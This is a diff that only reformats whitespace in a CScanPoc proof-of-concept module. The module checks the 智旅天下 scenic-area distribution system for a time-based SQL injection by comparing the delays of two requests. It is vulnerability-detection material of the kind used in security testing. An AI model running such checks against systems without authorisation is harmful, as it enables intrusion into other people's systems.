@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
     vuln_id = 'Zhilvtianxia_0000'  # 平台漏洞编号，留空
     name = '智旅天下景区分销系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-10-05'  # 漏洞公布时间
     desc = '''
         同程旅游将投入1亿元人民币全面进军“智慧景区”市场，并已成立全资子公司智旅天下信息技术有限公司。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '智旅天下景区分销系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '941c14be-33ca-477e-9ecd-5b7bbc00ce66'
@@ -44,7 +46,7 @@ class Poc(ABPoc):
             code2, _, res, _, _ = hh.http(url1)
             false_time = time.time() - t2
 
-            if code1==200 and code2 == 200 and false_time-true_time>4.5:
+            if code1 == 200 and code2 == 200 and false_time-true_time > 4.5:
                 security_hole(url1)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -54,6 +56,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
